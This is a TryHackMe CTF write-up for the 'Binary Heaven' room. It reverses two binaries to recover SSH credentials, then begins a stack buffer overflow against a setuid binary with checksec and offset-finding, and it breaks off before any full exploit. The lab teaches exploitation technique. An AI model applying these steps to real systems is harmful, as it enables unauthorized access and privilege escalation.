# Binary Heaven

Welcome to my another writeup! In this TryHackMe [Binary Heaven](https://tryhackme.com/room/binaryheaven) room, you'll learn: Reverse engineering Linux LSE executable, stack buffer overflow with ROP chaining, exploiting relative path and more! Without further ado, let's dive in.

## Background

> Let us enjoy the heaven of binaries

```
To enter into heaven, you have to first show if you are worthy or not. Here are 2 angels from the heaven of binaries, approach them with joy and you shall receive happiness.
```

- Overall difficulty for me: Hard
  - Initial foothold: Medium
  - Privilege escalation: Hard

## Service Enumeration

As usual, scan the machine for open ports via `rustscan`!

**Rustscan:**
```
┌──(root🌸siunam)-[~/ctf/thm/ctf/Binary-Heaven]
└─# export RHOSTS=10.10.124.63 
                                                                                                           
┌──(root🌸siunam)-[~/ctf/thm/ctf/Binary-Heaven]
└─# rustscan --ulimit 5000 -t 2000 --range=1-65535 $RHOSTS -- -sC -sV -oN rustscan/rustscan.txt
[...]
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 1cf70a100e561f69e1d4a6841993ec22 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCvEnzqGnoqGQwHNI4eYUTXonK3vlcjLkKZi2cTwglrxBRuwCvmXO56RCjBtlVLbAXhPsZgUy9QYxE68P3FN9T69BELLGd1ZovRv5nX60/Cz/gc0NS/YLNbwWjGBMuqfIY2+nTTMGZ/EYUv343j3LA0RCy/BTLdnjomJbkMBvFZzmRxZzNFG4LqnOLk9eN+VjsadKqXLoxqoI+Owtj9nKMwaSkw3jpsA+QbtonvRCUjiEOiO26T8Q2tXvBM65Pp89FWL/HZvUXn81ycvMPsfujspGTvgfrF/zyqCfRLczOWLEDYuaw91f7P/abZ/02B6FolpDMuvNtEFofiK1pc6u6J
|   256 400a887b7dc719d774422041c8cf3437 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBEg/tfLCU4Z4quadJCk9sHS3GJYntlvlxlaazbeFULXRb18S0o84xSqAlr2D8Kbg1JlxI/lqa5uxd/hZTQr6Jac=
|   256 af027950541e0beeb3d9c45c37cd28de (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIA5B5aE2Zl6O8VdBvkAqUZoc15fnCEpIc941H1OwXVzC
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

According to `rustscan` result, we have 1 port is opened:

Open Ports        | Service
------------------|------------------------
22                | OpenSSH 7.2p2 Ubuntu

**In this room, we can download a file called `credentials.zip`:**
```
┌──(root🌸siunam)-[~/ctf/thm/ctf/Binary-Heaven]
└─# file credentials.zip       
credentials.zip: Zip archive data, at least v2.0 to extract, compression method=deflate
```

Let's `unzip` it!

```
┌──(root🌸siunam)-[~/ctf/thm/ctf/Binary-Heaven]
└─# unzip credentials.zip 
Archive:  credentials.zip
  inflating: angel_A                 
  inflating: angel_B 

┌──(root🌸siunam)-[~/ctf/thm/ctf/Binary-Heaven]
└─# file angel_*          
angel_A: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=90a71dbbf2c94dc164a49328fb82f8fa914a9701, for GNU/Linux 3.2.0, not stripped
angel_B: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), statically linked, Go BuildID=Xd_LgpWItJBNJmN63lQy/oWW_4FYae77KCrbbrcIX/2pmyS7gUszdXBsoOAYWo/PyEjnQ2VYI7PIdiOmGXg, not stripped
```

**They are an ELF 64-bit LSB executable!**

### Angel_A

We can start reverse engineering the `angel_A` executable first.

**I'll use `strings` to list all the strings in the executable:**
```
┌──(root🌸siunam)-[~/ctf/thm/ctf/Binary-Heaven]
└─# strings angel_A               
[...]
Using debuggers? Here is tutorial https://www.youtube.com/watch?v=dQw4w9WgXcQ/n%22
[36m
Say my username >> 
[31m
That is not my username!
[32m
Correct! That is my name!
[...]
username
[...]
```

That YouTube link is a rickroll, nice :D

**Nothing weird in `strings`, let's use `r2`, or `radare2` to dig deeper:**
```
┌──(root🌸siunam)-[~/ctf/thm/ctf/Binary-Heaven]
└─# r2 -d -A angel_A
[x] Analyze all flags starting with sym. and entry0 (aa)
[x] Analyze function calls (aac)
[x] Analyze len bytes of instructions for references (aar)
[x] Finding and parsing C++ vtables (avrr)
[x] Skipping type matching analysis in debugger mode (aaft)
[x] Propagate noreturn information (aanr)
[x] Use -AA or aaaa to perform additional experimental analysis.
```

**Listing all functions:**
```
[0x7fe29a8c9950]> afl
0x562ec5ca8090    1 43           entry0
0x562ec5caafe0    5 4124 -> 4126 reloc.__libc_start_main
0x562ec5ca80c0    4 41   -> 34   sym.deregister_tm_clones
0x562ec5ca80f0    4 57   -> 51   sym.register_tm_clones
0x562ec5ca8130    5 57   -> 50   sym.__do_global_dtors_aux
0x562ec5ca8080    1 6            sym.imp.__cxa_finalize
0x562ec5ca8170    1 5            entry.init0
0x562ec5ca8000    3 23           sym._init
0x562ec5ca82c0    1 1            sym.__libc_csu_fini
0x562ec5ca82c4    1 9            sym._fini
0x562ec5ca8260    4 93           sym.__libc_csu_init
0x562ec5ca8175    8 225          main
0x562ec5ca8030    1 6            sym.imp.puts
0x562ec5ca8040    1 6            sym.imp.printf
0x562ec5ca7000    3 348  -> 337  loc.imp._ITM_deregisterTMCloneTable
0x562ec5ca8050    1 6            sym.imp.fgets
0x562ec5ca8060    1 6            sym.imp.ptrace
0x562ec5ca8070    1 6            sym.imp.exit
```

**Let's look at the `main()` function!**
```
[0x7fe29a8c9950]> pdf @main
            ; DATA XREF from entry0 @ 0x562ec5ca80ad
┌ 225: int main (int argc, char **argv);
│           ; var int64_t var_20h @ rbp-0x20
│           ; var int64_t var_14h @ rbp-0x14
│           ; var int64_t var_dh @ rbp-0xd
│           ; var int64_t var_4h @ rbp-0x4
│           ; arg int argc @ rdi
│           ; arg char **argv @ rsi
│           0x562ec5ca8175      55             push rbp
│           0x562ec5ca8176      4889e5         mov rbp, rsp
│           0x562ec5ca8179      4883ec20       sub rsp, 0x20
│           0x562ec5ca817d      897dec         mov dword [var_14h], edi ; argc
│           0x562ec5ca8180      488975e0       mov qword [var_20h], rsi ; argv
│           0x562ec5ca8184      b900000000     mov ecx, 0
│           0x562ec5ca8189      ba01000000     mov edx, 1
│           0x562ec5ca818e      be00000000     mov esi, 0
│           0x562ec5ca8193      bf00000000     mov edi, 0
│           0x562ec5ca8198      b800000000     mov eax, 0
│           0x562ec5ca819d      e8befeffff     call sym.imp.ptrace     ; long ptrace(__ptrace_request request, pid_t pid, void*addr, void*data)
│           0x562ec5ca81a2      4883f8ff       cmp rax, 0xffffffffffffffff
│       ┌─< 0x562ec5ca81a6      751b           jne 0x562ec5ca81c3
│       │   0x562ec5ca81a8      488d3d590e00.  lea rdi, str.Using_debuggers__Here_is_tutorial_https:__www.youtube.com_watch_vdQw4w9WgXcQ_n_22 ; 0x562ec5ca9008 ; "Using debuggers? Here is tutorial https://www.youtube.com/watch?v=dQw4w9WgXcQ/n%22"
│       │   0x562ec5ca81af      b800000000     mov eax, 0
│       │   0x562ec5ca81b4      e887feffff     call sym.imp.printf     ; int printf(const char *format)
│       │   0x562ec5ca81b9      bf01000000     mov edi, 1
│       │   0x562ec5ca81be      e8adfeffff     call sym.imp.exit
│       └─> 0x562ec5ca81c3      488d3d910e00.  lea rdi, str.e_36m_nSay_my_username____e_0m ; 0x562ec5ca905b
│           0x562ec5ca81ca      b800000000     mov eax, 0
│           0x562ec5ca81cf      e86cfeffff     call sym.imp.printf     ; int printf(const char *format)
│           0x562ec5ca81d4      488b15a52e00.  mov rdx, qword [reloc.stdin] ; [0x562ec5cab080:8]=0
│           0x562ec5ca81db      488d45f3       lea rax, [var_dh]
│           0x562ec5ca81df      be09000000     mov esi, 9
│           0x562ec5ca81e4      4889c7         mov rdi, rax
│           0x562ec5ca81e7      e864feffff     call sym.imp.fgets      ; char *fgets(char *s, int size, FILE *stream)
│           0x562ec5ca81ec      c745fc000000.  mov dword [var_4h], 0
│       ┌─< 0x562ec5ca81f3      eb48           jmp 0x562ec5ca823d
│      ┌──> 0x562ec5ca81f5      8b45fc         mov eax, dword [var_4h]
│      ╎│   0x562ec5ca81f8      4898           cdqe
│      ╎│   0x562ec5ca81fa      488d14850000.  lea rdx, [rax*4]
│      ╎│   0x562ec5ca8202      488d05572e00.  lea rax, obj.username   ; 0x562ec5cab060 ; U"kym~humr"
│      ╎│   0x562ec5ca8209      8b1402         mov edx, dword [rdx + rax]
│      ╎│   0x562ec5ca820c      8b45fc         mov eax, dword [var_4h]
│      ╎│   0x562ec5ca820f      4898           cdqe
│      ╎│   0x562ec5ca8211      0fb64405f3     movzx eax, byte [rbp + rax - 0xd]
│      ╎│   0x562ec5ca8216      83f004         xor eax, 4
│      ╎│   0x562ec5ca8219      0fbec0         movsx eax, al
│      ╎│   0x562ec5ca821c      83c008         add eax, 8
│      ╎│   0x562ec5ca821f      39c2           cmp edx, eax
│     ┌───< 0x562ec5ca8221      7416           je 0x562ec5ca8239
│     │╎│   0x562ec5ca8223      488d3d560e00.  lea rdi, str.e_31m_nThat_is_not_my_username_e_0m ; 0x562ec5ca9080
│     │╎│   0x562ec5ca822a      e801feffff     call sym.imp.puts       ; int puts(const char *s)
│     │╎│   0x562ec5ca822f      bf00000000     mov edi, 0
│     │╎│   0x562ec5ca8234      e837feffff     call sym.imp.exit
│     └───> 0x562ec5ca8239      8345fc01       add dword [var_4h], 1
│      ╎│   ; CODE XREF from main @ 0x562ec5ca81f3
│      ╎└─> 0x562ec5ca823d      837dfc07       cmp dword [var_4h], 7
│      └──< 0x562ec5ca8241      7eb2           jle 0x562ec5ca81f5
│           0x562ec5ca8243      488d3d5e0e00.  lea rdi, str.e_32m_nCorrect__That_is_my_name_e_0m ; 0x562ec5ca90a8
│           0x562ec5ca824a      e8e1fdffff     call sym.imp.puts       ; int puts(const char *s)
│           0x562ec5ca824f      b800000000     mov eax, 0
│           0x562ec5ca8254      c9             leave
└           0x562ec5ca8255      c3             ret
```

**In the above decompiled `main()` function, the `kym~humr` is being XOR'ed by 4, and then added 8.**

**To retrieve the username before XOR'ed and added 8, we can reverse that by writing a [python script](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Binary-Heaven/angel_A_re.py):**
```py
#!/usr/env/bin python3

def main():
	XORed_value = 'kym~humr'
	username = ''

	for each_character in XORed_value:
		unicode_value = ord(each_character)
		username += chr((unicode_value - 8) ^ 4)
	
	return username 

if __name__ == '__main__':
	print(main())
```

**Output:**
```
┌──(root🌸siunam)-[~/ctf/thm/ctf/Binary-Heaven]
└─# python3 angel_A_re.py
guardian
```

```
┌──(root🌸siunam)-[~/ctf/thm/ctf/Binary-Heaven]
└─# ./angel_A

Say my username >> guardian

Correct! That is my name!
```

- Username: guardian

### Angel_B

```
┌──(root🌸siunam)-[~/ctf/thm/ctf/Binary-Heaven]
└─# ./angel_B
 
Say the magic word >> 
hello
 
You are not worthy of heaven!
```

**Let's reverse engineering it via `gdb`'s `gef` plugin!**
```
┌──(root🌸siunam)-[~/ctf/thm/ctf/Binary-Heaven]
└─# gdb ./angel_B
```

**In here, we can list all of the functions name:**
```
gef➤  info functions
All defined functions:

File /mnt/c/Users/User/Downloads/binary_heaven/password.go:
	void main.main(void);
[...]
```

**the `main.main` looks like the main function of this binary!**

We can set a breakpoint at `main.main` function to see what happen:

```
gef➤  break main.main
Breakpoint 1 at 0x4a52c0: file /mnt/c/Users/User/Downloads/binary_heaven/password.go, line 3.
gef➤  run
[...]
```

**And we can use `disass` to dump all assemble codes in a function:**
```
gef➤  disass main.main
Dump of assembler code for function main.main:
=> 0x00000000004a52c0 <+0>:	mov    rcx,QWORD PTR fs:0xfffffffffffffff8
   0x00000000004a52c9 <+9>:	lea    rax,[rsp-0x40]
   0x00000000004a52ce <+14>:	cmp    rax,QWORD PTR [rcx+0x10]
   0x00000000004a52d2 <+18>:	jbe    0x4a5560 <main.main+672>
   0x00000000004a52d8 <+24>:	sub    rsp,0xc0
   0x00000000004a52df <+31>:	mov    QWORD PTR [rsp+0xb8],rbp
   0x00000000004a52e7 <+39>:	lea    rbp,[rsp+0xb8]
   0x00000000004a52ef <+47>:	lea    rax,[rip+0x24cce]        # 0x4c9fc4
   0x00000000004a52f6 <+54>:	mov    QWORD PTR [rsp],rax
   0x00000000004a52fa <+58>:	mov    QWORD PTR [rsp+0x8],0x5
   0x00000000004a5303 <+67>:	call   0x40a120 <runtime.convTstring>
   0x00000000004a5308 <+72>:	mov    rax,QWORD PTR [rsp+0x10]
   0x00000000004a530d <+77>:	xorps  xmm0,xmm0
   0x00000000004a5310 <+80>:	movups XMMWORD PTR [rsp+0x98],xmm0
   0x00000000004a5318 <+88>:	movups XMMWORD PTR [rsp+0xa8],xmm0
   0x00000000004a5320 <+96>:	lea    rcx,[rip+0xbb99]        # 0x4b0ec0
   0x00000000004a5327 <+103>:	mov    QWORD PTR [rsp+0x98],rcx
   0x00000000004a532f <+111>:	mov    QWORD PTR [rsp+0xa0],rax
   0x00000000004a5337 <+119>:	mov    QWORD PTR [rsp+0xa8],rcx
   0x00000000004a533f <+127>:	lea    rax,[rip+0x441ea]        # 0x4e9530
   0x00000000004a5346 <+134>:	mov    QWORD PTR [rsp+0xb0],rax
   0x00000000004a534e <+142>:	mov    rax,QWORD PTR [rip+0xc395b]        # 0x568cb0 <os.Stdout>
   0x00000000004a5355 <+149>:	lea    rdx,[rip+0x45a04]        # 0x4ead60 <go.itab.*os.File,io.Writer>
   0x00000000004a535c <+156>:	mov    QWORD PTR [rsp],rdx
   0x00000000004a5360 <+160>:	mov    QWORD PTR [rsp+0x8],rax
   0x00000000004a5365 <+165>:	lea    rax,[rsp+0x98]
   0x00000000004a536d <+173>:	mov    QWORD PTR [rsp+0x10],rax
   0x00000000004a5372 <+178>:	mov    QWORD PTR [rsp+0x18],0x2
   0x00000000004a537b <+187>:	mov    QWORD PTR [rsp+0x20],0x2
   0x00000000004a5384 <+196>:	call   0x499620 <fmt.Fprintln>
   0x00000000004a5389 <+201>:	lea    rax,[rip+0xbb30]        # 0x4b0ec0
   0x00000000004a5390 <+208>:	mov    QWORD PTR [rsp],rax
   0x00000000004a5394 <+212>:	call   0x40cde0 <runtime.newobject>
   0x00000000004a5399 <+217>:	mov    rax,QWORD PTR [rsp+0x8]
   0x00000000004a539e <+222>:	mov    QWORD PTR [rsp+0x40],rax
   0x00000000004a53a3 <+227>:	xorps  xmm0,xmm0
   0x00000000004a53a6 <+230>:	movups XMMWORD PTR [rsp+0x48],xmm0
   0x00000000004a53ab <+235>:	lea    rcx,[rip+0x95ee]        # 0x4ae9a0
   0x00000000004a53b2 <+242>:	mov    QWORD PTR [rsp+0x48],rcx
   0x00000000004a53b7 <+247>:	mov    QWORD PTR [rsp+0x50],rax
   0x00000000004a53bc <+252>:	mov    rcx,QWORD PTR [rip+0xc38e5]        # 0x568ca8 <os.Stdin>
   0x00000000004a53c3 <+259>:	lea    rdx,[rip+0x45976]        # 0x4ead40 <go.itab.*os.File,io.Reader>
   0x00000000004a53ca <+266>:	mov    QWORD PTR [rsp],rdx
   0x00000000004a53ce <+270>:	mov    QWORD PTR [rsp+0x8],rcx
   0x00000000004a53d3 <+275>:	lea    rcx,[rsp+0x48]
   0x00000000004a53d8 <+280>:	mov    QWORD PTR [rsp+0x10],rcx
   0x00000000004a53dd <+285>:	mov    QWORD PTR [rsp+0x18],0x1
   0x00000000004a53e6 <+294>:	mov    QWORD PTR [rsp+0x20],0x1
   0x00000000004a53ef <+303>:	call   0x49f8c0 <fmt.Fscanln>
   0x00000000004a53f4 <+308>:	mov    rax,QWORD PTR [rsp+0x40]
   0x00000000004a53f9 <+313>:	mov    rcx,QWORD PTR [rax+0x8]
   0x00000000004a53fd <+317>:	mov    rax,QWORD PTR [rax]
   0x00000000004a5400 <+320>:	cmp    rcx,0xb
   0x00000000004a5404 <+324>:	je     0x4a54a1 <main.main+481>
   0x00000000004a540a <+330>:	lea    rax,[rip+0x24ba9]        # 0x4c9fba
   0x00000000004a5411 <+337>:	mov    QWORD PTR [rsp],rax
   0x00000000004a5415 <+341>:	mov    QWORD PTR [rsp+0x8],0x5
   0x00000000004a541e <+350>:	xchg   ax,ax
   0x00000000004a5420 <+352>:	call   0x40a120 <runtime.convTstring>
   0x00000000004a5425 <+357>:	mov    rax,QWORD PTR [rsp+0x10]
   0x00000000004a542a <+362>:	xorps  xmm0,xmm0
   0x00000000004a542d <+365>:	movups XMMWORD PTR [rsp+0x58],xmm0
   0x00000000004a5432 <+370>:	movups XMMWORD PTR [rsp+0x68],xmm0
   0x00000000004a5437 <+375>:	lea    rcx,[rip+0xba82]        # 0x4b0ec0
   0x00000000004a543e <+382>:	mov    QWORD PTR [rsp+0x58],rcx
   0x00000000004a5443 <+387>:	mov    QWORD PTR [rsp+0x60],rax
   0x00000000004a5448 <+392>:	mov    QWORD PTR [rsp+0x68],rcx
   0x00000000004a544d <+397>:	lea    rax,[rip+0x440fc]        # 0x4e9550
   0x00000000004a5454 <+404>:	mov    QWORD PTR [rsp+0x70],rax
   0x00000000004a5459 <+409>:	mov    rax,QWORD PTR [rip+0xc3850]        # 0x568cb0 <os.Stdout>
   0x00000000004a5460 <+416>:	lea    rcx,[rip+0x458f9]        # 0x4ead60 <go.itab.*os.File,io.Writer>
   0x00000000004a5467 <+423>:	mov    QWORD PTR [rsp],rcx
   0x00000000004a546b <+427>:	mov    QWORD PTR [rsp+0x8],rax
   0x00000000004a5470 <+432>:	lea    rax,[rsp+0x58]
   0x00000000004a5475 <+437>:	mov    QWORD PTR [rsp+0x10],rax
   0x00000000004a547a <+442>:	mov    QWORD PTR [rsp+0x18],0x2
   0x00000000004a5483 <+451>:	mov    QWORD PTR [rsp+0x20],0x2
   0x00000000004a548c <+460>:	call   0x499620 <fmt.Fprintln>
   0x00000000004a5491 <+465>:	mov    rbp,QWORD PTR [rsp+0xb8]
   0x00000000004a5499 <+473>:	add    rsp,0xc0
   0x00000000004a54a0 <+480>:	ret    
   0x00000000004a54a1 <+481>:	mov    QWORD PTR [rsp],rax
   0x00000000004a54a5 <+485>:	lea    rax,[rip+0x2585f]        # 0x4cad0b
   0x00000000004a54ac <+492>:	mov    QWORD PTR [rsp+0x8],rax
   0x00000000004a54b1 <+497>:	mov    QWORD PTR [rsp+0x10],rcx
   0x00000000004a54b6 <+502>:	call   0x4022e0 <runtime.memequal>
   0x00000000004a54bb <+507>:	cmp    BYTE PTR [rsp+0x18],0x0
   0x00000000004a54c0 <+512>:	je     0x4a540a <main.main+330>
   0x00000000004a54c6 <+518>:	lea    rax,[rip+0x24af2]        # 0x4c9fbf
   0x00000000004a54cd <+525>:	mov    QWORD PTR [rsp],rax
   0x00000000004a54d1 <+529>:	mov    QWORD PTR [rsp+0x8],0x5
   0x00000000004a54da <+538>:	call   0x40a120 <runtime.convTstring>
   0x00000000004a54df <+543>:	mov    rax,QWORD PTR [rsp+0x10]
   0x00000000004a54e4 <+548>:	xorps  xmm0,xmm0
   0x00000000004a54e7 <+551>:	movups XMMWORD PTR [rsp+0x78],xmm0
   0x00000000004a54ec <+556>:	movups XMMWORD PTR [rsp+0x88],xmm0
   0x00000000004a54f4 <+564>:	lea    rcx,[rip+0xb9c5]        # 0x4b0ec0
   0x00000000004a54fb <+571>:	mov    QWORD PTR [rsp+0x78],rcx
   0x00000000004a5500 <+576>:	mov    QWORD PTR [rsp+0x80],rax
   0x00000000004a5508 <+584>:	mov    QWORD PTR [rsp+0x88],rcx
   0x00000000004a5510 <+592>:	lea    rax,[rip+0x44029]        # 0x4e9540
   0x00000000004a5517 <+599>:	mov    QWORD PTR [rsp+0x90],rax
   0x00000000004a551f <+607>:	mov    rax,QWORD PTR [rip+0xc378a]        # 0x568cb0 <os.Stdout>
   0x00000000004a5526 <+614>:	lea    rcx,[rip+0x45833]        # 0x4ead60 <go.itab.*os.File,io.Writer>
   0x00000000004a552d <+621>:	mov    QWORD PTR [rsp],rcx
   0x00000000004a5531 <+625>:	mov    QWORD PTR [rsp+0x8],rax
   0x00000000004a5536 <+630>:	lea    rax,[rsp+0x78]
   0x00000000004a553b <+635>:	mov    QWORD PTR [rsp+0x10],rax
   0x00000000004a5540 <+640>:	mov    QWORD PTR [rsp+0x18],0x2
   0x00000000004a5549 <+649>:	mov    QWORD PTR [rsp+0x20],0x2
   0x00000000004a5552 <+658>:	call   0x499620 <fmt.Fprintln>
   0x00000000004a5557 <+663>:	jmp    0x4a5491 <main.main+465>
   0x00000000004a555c <+668>:	nop    DWORD PTR [rax+0x0]
   0x00000000004a5560 <+672>:	call   0x461620 <runtime.morestack_noctxt>
   0x00000000004a5565 <+677>:	jmp    0x4a52c0 <main.main>
End of assembler dump.
```

**Those instructions look interesting!**
```
0x00000000004a53ef <+303>:	call   0x49f8c0 <fmt.Fscanln>
[...]
0x00000000004a5400 <+320>:	cmp    rcx,0xb
[...]
0x00000000004a54b6 <+502>:	call   0x4022e0 <runtime.memequal>
```

What this does is:

- Call function `fmt.Fscanln`, which reads the user's input.
- Compare `RCX` register with 11 length (`B` in hex means 11)
- Call function `runtime.memequal`, which compares some registers

Let's set a breakpoint at `0x00000000004a54b6`!

```
gef➤  break *0x00000000004a54b6
Breakpoint 2 at 0x4a54b6: file /mnt/c/Users/User/Downloads/binary_heaven/password.go, line 14.
gef➤  run
[...]
gef➤  c
Continuing.
 
Say the magic word >> 

```

**In here, we need to type 11 length of characters:**
```
Say the magic word >>
12345678901

Thread 1 "angel_B" hit Breakpoint 2, 0x00000000004a54b6 in main.main () at /mnt/c/Users/User/Downloads/binary_heaven/password.go:14
14	in /mnt/c/Users/User/Downloads/binary_heaven/password.go
[...]
$rax   : 0x000000004cad0b  →  "{Redacted}IdeographicMedefaidrinNandinagariNew_Ta[...]"
```

In the `RAX` register, there is a string that looks like a password!

**We can confirm that by running the binary:**
```
┌──(root🌸siunam)-[~/ctf/thm/ctf/Binary-Heaven]
└─# ./angel_B
 
Say the magic word >> 
{Redacted}
 
Right password! Now GO ahead and SSH into heaven.
```

## Initial Foothold

**Armed with the above information, let's SSH into user `guardian`!**
```
┌──(root🌸siunam)-[~/ctf/thm/ctf/Binary-Heaven]
└─# ssh guardian@$RHOSTS
guardian@10.10.124.63's password: 
[...]
guardian@heaven:~$ whoami;hostname;id;ip a
guardian
heaven
uid=1001(guardian) gid=1001(guardian) groups=1001(guardian)
[...]
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 9001 qdisc pfifo_fast state UP group default qlen 1000
    link/ether 02:11:7b:2d:0d:0f brd ff:ff:ff:ff:ff:ff
    inet 10.10.124.63/16 brd 10.10.255.255 scope global eth0
       valid_lft forever preferred_lft forever
    inet6 fe80::11:7bff:fe2d:d0f/64 scope link 
       valid_lft forever preferred_lft forever
```

**guardian_flag.txt:**
```
guardian@heaven:~$ cat guardian_flag.txt 
THM{Redacted}
```

## Privilege Escalation

### guardian to binexgod

**In `guardian` home directory, there is a binary that has SUID sticky bit, and it's owned by user `binexgod`!**
```
guardian@heaven:~$ ls -lah
[...]
-rwsr-sr-x 1 binexgod binexgod  16K May  8  2021 pwn_me
[...]

guardian@heaven:~$ file pwn_me 
pwn_me: setuid, setgid ELF 32-bit LSB shared object, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, BuildID[sha1]=09a0fc14e276c9e16015cc8efff3389f3e576ba6, for GNU/Linux 3.2.0, not stripped
```

```
guardian@heaven:~$ ./pwn_me 
Binexgod said he want to make this easy.
System is at: 0xf7d91950
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Segmentation fault (core dumped)
```

**This looks like is vulnerable to buffer overflow!**

**Let's transfer this binary to our attacker machine:**
```
guardian@heaven:~$ python3 -m http.server 8000
Serving HTTP on 0.0.0.0 port 8000 ...

┌──(root🌸siunam)-[~/ctf/thm/ctf/Binary-Heaven]
└─# wget http://$RHOSTS:8000/pwn_me;chmod +x pwn_me
```

**We can use `checksec` to check memory protections:**
```
┌──(root🌸siunam)-[~/ctf/thm/ctf/Binary-Heaven]
└─# checksec pwn_me             
[*] '/root/ctf/thm/ctf/Binary-Heaven/pwn_me'
    Arch:     i386-32-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

- Full RELRO = GOT read-only
- NX enabled = No execution (No shellcode)
- PIE enabled = Every time you run the file it gets loaded into a different memory address

**Now, we can use `gdb` again to exploit it:**

- First, find the EIP offset:

```
gef➤  pattern create
[+] Generating a pattern of 1024 bytes (n=4)
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacmaacnaacoaacpaacqaacraacsaactaacuaacvaacwaacxaacyaaczaadbaadcaaddaadeaadfaadgaadhaadiaadjaadkaadlaadmaadnaadoaadpaadqaadraadsaadtaaduaadvaadwaadxaadyaadzaaebaaecaaedaaeeaaefaaegaaehaaeiaaejaaekaaelaaemaaenaaeoaaepaaeqaaeraaesaaetaaeuaaevaaewaaexaaeyaaezaafbaafcaafdaafeaaffaafgaafhaafiaafjaafkaaflaafmaafnaafoaafpaafqaafraafsaaftaafuaafvaafwaafxaafyaafzaagbaagcaagdaageaagfaaggaaghaagiaagjaagkaaglaagmaagnaagoaagpaagqaagraagsaagtaaguaagvaagwaagxaagyaagzaahbaahcaahdaaheaahfaahgaahhaahiaahjaahkaahlaahmaahnaahoaahpaahqaahraahsaahtaahuaahvaahwaahxaahyaahzaaibaaicaaidaaieaaifaaigaaihaaiiaaijaaikaailaaimaainaaioaaipaaiqaairaaisaaitaaiuaaivaaiwaaixaaiyaaizaajbaajcaajdaajeaajfaajgaajhaajiaajjaajkaajlaajmaajnaajoaajpaajqaajraajsaajtaajuaajvaajwaajxaajyaajzaakbaakcaakdaakeaakfaak
[+] Saved as '$_gef0'
```

```
gef➤  r
Starting program: /root/ctf/thm/ctf/Binary-Heaven/pwn_me 
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
Binexgod said he want to make this easy.
System is at: 0xf7c47040
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacmaacnaacoaacpaacqaacraacsaactaacuaacvaacwaacxaacyaaczaadbaadcaaddaadeaadfaadgaadhaadiaadjaadkaadlaadmaadnaadoaadpaadqaadraadsaadtaaduaadvaadwaadxaadyaadzaaebaaecaaedaaeeaaefaaegaaehaaeiaaejaaekaaelaaemaaenaaeoaaepaaeqaaeraaesaaetaaeuaaevaaewaaexaaeyaaezaafbaafcaafdaafeaaffaafgaafhaafiaafjaafkaaflaafmaafnaafoaafpaafqaafraafsaaftaafuaafvaafwaafxaafyaafzaagbaagcaagdaageaagfaaggaaghaagiaagjaagkaaglaagmaagnaagoaagpaagqaagraagsaagtaaguaagvaagwaagxaagyaagzaahbaahcaahdaaheaahfaahgaahhaahiaahjaahkaahlaahmaahnaahoaahpaahqaahraahsaahtaahuaahvaahwaahxaahyaahzaaibaaicaaidaaieaaifaaigaaihaaiiaaijaaikaailaaimaainaaioaaipaaiqaairaaisaaitaaiuaaivaaiwaaixaaiyaaizaajbaajcaajdaajeaajfaajgaajhaajiaajjaajkaajlaajmaajnaajoaajpaajqaajraajsaajtaajuaajvaajwaajxaajyaajzaakbaakcaakdaakeaakfaak

Program received signal SIGSEGV, Segmentation fault.
0x61616169 in ?? ()
[...]
──────────────────────────────────────────────────────────────────────────────────────────── registers ────
$eax   : 0xffffce8c  →  "aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaama[...]"
$ebx   : 0x61616167 ("gaaa"?)
$ecx   : 0xf7e229c0  →  0x00000000
$edx   : 0x1       
$esp   : 0xffffceb0  →  "jaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaava[...]"
$ebp   : 0x61616168 ("haaa"?)
$esi   : 0x0       
$edi   : 0xf7ffcb80  →  0x00000000
$eip   : 0x61616169 ("iaaa"?)
$eflags: [zero carry parity adjust SIGN trap INTERRUPT direction overflow RESUME virtualx86 identification]
$cs: 0x23 $ss: 0x2b $ds: 0x2b $es: 0x2b $fs: 0x00 $gs: 0x63 
[...]
```

**We can see that the `EIP` register is overflowed with `iaaa`.**

**Let's use `pattern offset` to find the EIP offset!**
```
gef➤  pattern offset 0x61616168
[+] Searching for '0x61616168'
[+] Found at offset 32 (little-endian search) likely
[+] Found at offset 29 (big-endian search)
```

Found it!

- EIP offset: 32

**We can run the binary again with 32 A's, and 4 B's:**
```
┌──(root🌸siunam)-[~/ctf/thm/ctf/Binary-Heaven]
└─# python3 -c "print('A' * 32 + 'B' * 4)"
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBB
```

```
gef➤  r
Starting program: /root/ctf/thm/ctf/Binary-Heaven/pwn_me 
[Thread debugging using libthread_db enabled]
